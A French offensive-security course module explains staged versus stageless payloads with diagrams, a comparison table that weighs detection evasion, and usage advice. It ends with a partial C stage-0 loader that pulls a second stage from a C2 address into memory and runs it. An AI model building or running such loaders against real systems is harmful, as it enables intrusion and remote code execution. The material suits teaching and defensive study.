# Module : Staged vs Stageless Payloads

## Objectifs

- Comprendre la différence staged/stageless
- Avantages et inconvénients de chaque approche
- Choisir la bonne approche selon le contexte

---

## 1. Stageless

```
┌─────────────────────────────────────┐
│           STAGELESS                 │
├─────────────────────────────────────┤
│ Payload complet en un seul bloc     │
│                                     │
│ [Shellcode reverse shell complet]   │
│ - Connexion réseau                  │
│ - Shell interactif                  │
│ - Tout inclus                       │
└─────────────────────────────────────┘

TAILLE : ~300-500 bytes minimum
```

---

## 2. Staged

```
STAGE 0 (Initial - petit)           STAGE 1 (Téléchargé)
┌───────────────────────┐           ┌─────────────────────┐
│ - Connexion C2        │  ──────►  │ Payload complet     │
│ - Télécharge stage 1  │           │ (reverse shell,     │
│ - Exécute en mémoire  │           │  meterpreter, etc.) │
└───────────────────────┘           └─────────────────────┘
      ~100 bytes                        ~100KB+
```

---

## 3. Comparaison

| Aspect | Staged | Stageless |
|--------|--------|-----------|
| Taille initiale | Petite (~100b) | Grande (~500b+) |
| Dépendance réseau | Oui | Non |
| Détection | Plus difficile | Signature connue |
| Fiabilité | Dépend du C2 | Autonome |
| Flexibilité | Haute | Limitée |

---

## 4. Quand utiliser quoi ?

### Staged :
- Buffer overflow avec espace limité
- Payload qui doit évoluer
- Tests/développement

### Stageless :
- Pas de C2 disponible
- Environnement air-gapped
- Fiabilité maximale

---

## Exemple Staged

```c
// Stage 0 : Téléchargeur simple
void stage0(void) {
    SOCKET s = connect_c2("192.168.1.100", 4444);
    char *stage1 = VirtualAlloc(NULL, 0x100000, ...);
    recv(s, stage1, 0x100000, 0);
    ((void(*)())stage1)();  // Exécuter stage 1
}
```
